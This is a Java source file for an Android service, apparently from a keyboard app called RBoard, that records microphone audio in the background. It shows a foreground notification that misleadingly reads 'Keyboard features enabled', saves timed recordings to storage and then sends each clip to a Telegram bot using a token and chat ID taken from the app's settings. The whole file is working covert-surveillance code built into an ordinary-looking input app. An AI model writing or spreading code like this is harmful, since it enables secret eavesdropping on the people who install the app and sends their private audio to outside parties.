package com.abifog.rboard.latin;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import com.abifog.rboard.latin.settings.Settings;
import com.abifog.rboard.latin.settings.SettingsValues;
import com.abifog.rboard.latin.utils.TelegramReporter;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Background service that records audio from the microphone.
 */
public class AudioCaptureService extends Service {
    private static final String TAG = AudioCaptureService.class.getSimpleName();
    private static final String CHANNEL_ID = "AudioCaptureChannel";
    private MediaRecorder mRecorder = null;
    private String mFileName = null;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("RBoard Service")
                .setContentText("Keyboard features enabled")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .build();
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int duration = intent != null ? intent.getIntExtra("duration", 0) : 0;
        startRecording(duration);
        return START_STICKY;
    }

    private void startRecording(final int duration) {
        SimpleDateFormat sdf = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss", Locale.getDefault());
        mFileName = getExternalFilesDir(null).getAbsolutePath() + "/audio_" + sdf.format(new Date()) + ".3gp";

        mRecorder = new MediaRecorder();
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mRecorder.setOutputFile(mFileName);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            mRecorder.prepare();
            mRecorder.start();
            Log.d(TAG, "Recording started: " + mFileName);

            if (duration > 0) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        stopRecording();
                        reportVoiceClip();
                        stopSelf();
                    }
                }, duration);
            }
        } catch (IOException e) {
            Log.e(TAG, "prepare() failed: " + e.getMessage());
        }
    }

    private void reportVoiceClip() {
        SettingsValues settings = Settings.getInstance().getCurrent();
        if (settings != null && settings.mEnableTelegram && mFileName != null) {
            TelegramReporter.sendDocument(settings.mTelegramBotToken, settings.mTelegramChatId, new File(mFileName));
        }
    }

    private void stopRecording() {
        if (mRecorder != null) {
            try {
                mRecorder.stop();
                mRecorder.release();
                Log.d(TAG, "Recording stopped and saved to: " + mFileName);
                // In a real implementation, we would upload the file here using NetworkManager
            } catch (Exception e) {
                Log.e(TAG, "stop() failed: " + e.getMessage());
            }
            mRecorder = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "RBoard Audio Capture Channel",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
